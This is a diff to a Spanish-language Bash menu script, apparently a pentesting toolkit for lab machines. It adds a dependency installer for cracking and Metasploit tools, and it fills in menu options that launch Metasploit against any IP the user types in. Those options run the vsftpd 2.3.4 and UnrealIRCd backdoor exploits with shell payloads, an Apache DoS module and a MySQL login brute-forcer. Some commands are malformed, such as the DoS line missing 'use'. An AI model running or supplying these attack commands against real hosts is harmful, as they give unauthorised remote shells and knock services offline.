@@ -88,9 +88,9 @@ function fun_elec_dicc(){
 function fun_menu_msfconsole(){
 	
 	echo -e "${CIAN}1.${ND}Ataque a Vsftpd."
-	echo -e "${CIAN}2.${ND}Ataque a maquina Windows."
-	echo -e "${CIAN}3.${ND}Ataque a Distcc."
-	echo -e "${CIAN}4.${ND}Ataque a UneralIRCD."
+	echo -e "${CIAN}2.${ND}Ataque DoS a Apache."
+	echo -e "${CIAN}3.${ND}Ataque a MySQL."
+	echo -e "${CIAN}4.${ND}Ataque a UnrealIRCD."
 	echo -e "${ROJO}5.Volver atras.${ND} "
 	echo -e "${AZUL}========================${ND}"
 }
@@ -203,7 +203,7 @@ function fun_menu_general (){
  function fun_menu_principal (){	 
 	clear
 	#Parte bonita menu
-	figlet -f Double menu
+	figlet -f Big.flf menu
 	echo -e "${AZUL}========================${ND}"
 	echo -e "--------- ${AZUL}MENU${ND} ---------"
 	echo -e "${AZUL}========================${ND}"
@@ -229,6 +229,27 @@ ND='\033[0m' # nada
 #Script:
 
 #Comprobacion Instalacion de paquetes
+read -p "Quiere instalar las dependencias? (s/n)" dependencias
+if [ "$dependencias" = "s" ] || [ "$dependencias" = "S" ]
+then 
+	echo "Instalando dependencias"
+	sudo apt update 
+	sudo apt install -y toilet 
+	sudo apt install -y figlet 
+	sudo rm -R /usr/share/figlet 
+	sudo mkdir /usr/share/figlet/ 
+	sudo git clone https://github.com/xero/figlet-fonts.git /usr/share/figlet
+	sudo apt install -y john
+	sudo apt install -y wordlists
+	sudo apt install -y debsums
+	sudo apt install -y hashcat
+	sudo apt install -y libimage-exiftool-perl
+	sudo apt install -y theharvester
+	sudo apt install -y metasploit-framework
+	read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla			
+fi
+
+
 
 #Funcionalidad Principal
 
@@ -236,7 +257,7 @@ ND='\033[0m' # nada
 i=0
 while true
 do
-	fun_menu_principal
+	fun_menu_principal 
 	
 	#Bucle control valor variable i dentro de parametros
 		read -p $'\e[33mElige una opcion\e[0m: ' i
@@ -245,9 +266,9 @@ do
 			# Elige una de las dos condiciones de manera aleatoria	
 			if (( RANDOM % 2 )); 
 			then 
-				figlet -f Fuzzy Hola campeon
+				figlet -f Fuzzy.flf Hola campeon
 			else 
-				figlet -f maxiwi Deja de tocar pesao
+				figlet -f maxiwi.flf Deja de tocar pesao
 			fi
 			
 			# Confirmacion para avanzar
@@ -752,26 +773,41 @@ do
 				read -p $'\e[33mElige una opcion\e[0m: ' i_msfconsole
 				
 				case $i_msfconsole in
-					1)
-						
+					1)#VSFTPD
+						#Definicion de las variables
 						read -p "Especifica la ip objetivo: " ipObjetivo
-
 						read -p "Especifica el puerto: " puertObjetivo
+						#Ataque desde mfconsole
+						msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set payload cmd/unix/interact; set RHOSTS $ipObjetivo; set RPORT $puertObjetivo; run; exit "
 						
-						msfconsole -q -x "use auxiliary/dos/tcp/synflood;set RHOST $TARGET; exploit;
-						msfconsole -q -x use exploit/unix/ftp/vsftpd_234_backdoor;set payload cmd/un>
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 					;;
-					2)
-						echo "2"
+					2)#Apache DoS
+						#Definicion de las variables
+						read -p "Especifica la ip objetivo: " ipObjetivo						
+						read -p "Especifica la cantidad de paquetes a enviar: " cantidadPaquetes
+						read -p "Especifica el puerto: " puertObjetivo
+						#Ataque desde mfconsole
+						msfconsole -q -x "dos/http/apache_commons_fileupload_dos;set payload cmd/unix/interact; set RHOSTS $ipObjetivo; set RLIMIT $cantidadPaquetes ; set RPORT $puertObjetivo; run; exit "
+						
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 					;;
-					3)
-						echo "3"
+					3)#Ataque a MySQL
+						#Definicion de las variables
+						read -p "Especifica la ip objetivo: " ipObjetivo
+						read -p "Especifica el puerto: " puertObjetivo
+						#Ataque desde mfconsole
+						msfconsole -q -x "use scanner/mysql/mysql_login;set payload cmd/unix/interact; set RHOSTS $ipObjetivo; set RPORT $puertObjetivo; run; exit "
+						
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 					;;
-					4)
-						echo "4"
+					4)#Ataque UnrealIRCD
+						#Definicion de las variables
+						read -p "Especifica la ip objetivo: " ipObjetivo
+						read -p "Especifica el puerto: " puertObjetivo
+						#Ataque desde mfconsole
+						msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor ; set RHOSTS $ipObjetivo; set RPORT $puertObjetivo;set payload cmd/unix/bind_ruby;  exploit "
+						
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 					;;
 					5)
